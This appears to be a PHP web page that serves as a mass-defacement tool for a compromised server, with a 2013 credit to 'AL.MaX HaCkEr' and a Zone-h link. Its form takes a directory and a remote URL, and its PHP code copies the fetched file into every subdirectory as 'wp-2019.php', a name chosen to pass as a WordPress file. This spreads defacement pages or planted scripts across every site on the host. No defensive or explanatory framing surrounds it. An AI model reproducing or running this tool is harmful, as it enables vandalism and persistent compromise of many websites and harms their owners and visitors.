<html xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<style type="text/css">

div.end
{
    width:100%;
    background:#222;
}

* {
    padding:0;
    margin:0;
}

div.end *
{
    font-size:small;
}

</style>
<title>Mass Defacer Server Folder</title>
</head>

<body style="background-color: #1F1F1F">

<body style="background-color: #1F1F1F">

<center>
<style>
body { color: #FFCC00;
}
.style3 {
	font-size: 40pt;
}
.style31 {
	text-align: center;
}
.style32 {
	font-family: "Bell MT";
}
.style33 {
	color: #FF6000;
}
.style39 {
	font-size: 60pt;
}
.style41 {
	font-size: xx-large;
}
.style42 {
	font-weight: bold;
	font-size: x-large;
}
</style>
</head>
<p class="style3">

<span <ul>

	<span class="style32">
	<span class="style39">
<span style="font-weight: 700;" class="style33">
	<font class="hk" style="text-shadow: 2px 2px 3px rgb(0, 0, 0);">Mass Defacer 
Server</font></span></span></span>
	</span></p><br>
<span style="font-weight: 700;" class="style33">
	<font class="hk" style="text-shadow: 2px 2px 3px rgb(0, 0, 0);"><br>
<br>
</center>
<div class="style31">
<html>
<style>
body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}
input,
.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}
button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}  
.style45 {
	background-color: #000000;
}
</style>
<?php
/*
Script: Mass Deface Script
*/
echo "<center><textarea rows='10' cols='100'>";
$defaceurl = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";
 
if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
                        if(filetype($dir.$file)=="dir"){
                                $newfile=$dir.$file."/wp-2019.php";
                                echo $newfile."\n";
                                if (!copy($defaceurl, $newfile)) {
                                        echo "failed to copy $file...\n";
                                }
                        }
        }
        closedir($dh);
    }
}
echo "</textarea></center>";
?>


<td align=right>Mass Defacement:</td><br>
	</div>
<form action='<?php basename($_SERVER['PHP_SELF']); ?>' method='post'>
<div class="style31">
[+] Main Directory: <input type='text' style='width: 250px' value='<?php  echo getcwd() . "/"; ?>' name='massdefacedir'>
[+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'>
<input type='submit' name='execmassdeface' value='Execute'></div>
	</form></td>
 
 

<br><br><br>



<br>
	<br>
	<br>
	<br>
	<br>
	<br>

<div class="end">
<p align="center" class="style45"><b>&nbsp;</b><br />
</p>
<table style="border: 2px solid rgb(218, 218, 218);" width="100%" bgcolor="#000000" height="%">
	<tr>
		<td><center class="style31"><font size="4" color="white" face="tahoma">
		<b>[ <span class="style27">&nbsp;<font size="5" color="red"><span style="font-weight: 700; filter: blur(add=1, direction=270, strength=30)"><font class="whiteglow" face="tahoma"><span <ul=""><font color="#808080" face="Tahoma"><span <ul="" lang="en-us"><font size="4" color="white" face="tahoma"><span class="style41">Tools</span><span class="style25"><font color="Green"><font class="style26" size="-2" color="gray"><span class="style21"><strong>
		<font size="4" color="white" face="tahoma">Mass Deface |</font></strong></span></font></font></span></font> 
		Copyright / <font color="#FFFFFF" face="Tahoma">2013
		<a style="text-decoration: none; " href="http://www.zone-h.com/archive/notifier=AL.MaX%20HaCkEr">
		<font color="#FFFFFF">AL.MaX HaCkEr </font></a></font></span>
		<font color="#000000">&nbsp;</font></font></span></font></span></font></span>&nbsp;]<span class="style27">
		</span><br>
		<span class="style27"><font size="5" color="red">
		<span style="font-weight: 700; filter: blur(add=1, direction=270, strength=30)">
		<font class="whiteglow" face="tahoma"><span <ul="">
		<font color="#808080" face="Tahoma">&nbsp; <font color="#000000">
		<a style="text-decoration: none" href="http://www.zone-h.com/archive/notifier=AL.MaX%20HaCkEr">
		<font color="#808080" face="Tahoma">Zone-h</font></a><font size="5" color="red" face="tahoma"><font class="whiteglow" face="tahoma"><font color="#808080" face="Tahoma">
		<img alt="" src="http://www.senojflags.com/images/national-flag-icons/Sudan-Flag.png" height="16" width="16"></font></font></font>
		</font></font></span></font></span></font></span></b>
		<strong class="style42">Gun@Linuxmail.Org</strong></font></center></td>
	</tr>
</table>
<p align="center" class="style45">&nbsp;</p>
<p align="center"></p>
</div>

<p class="style31">&nbsp;</p>

